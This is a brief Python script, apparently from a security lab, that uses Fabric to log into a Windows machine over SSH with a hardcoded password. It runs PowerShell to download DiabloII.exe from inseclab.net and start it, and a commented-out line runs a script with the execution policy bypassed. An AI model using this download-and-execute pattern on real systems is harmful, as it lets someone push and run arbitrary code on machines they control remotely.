from fabric import Connection
import time

ip = "192.168.230.55"
c = Connection(host = ip, user = 'user', port = 22, connect_kwargs={"password":"41879gY@"})
# c.run("cd Downloads & powershell -NoExit -ExecutionPolicy ByPass C:\\Users\\user\\Downloads\\user_actions.ps1")
c.run("cd Downloads & powershell ; (New-Object System.Net.WebClient).DownloadFile('http://inseclab.net/DiabloII.exe','C:\\Users\\user\\Downloads\\DiabloII.exe'); Start-Process -NoExit 'C:\\Users\\user\\Downloads\\DiabloII.exe'")
# c.local("powershell Start-Process C:\\Users\\user\\Downloads\\DiabloII.exe")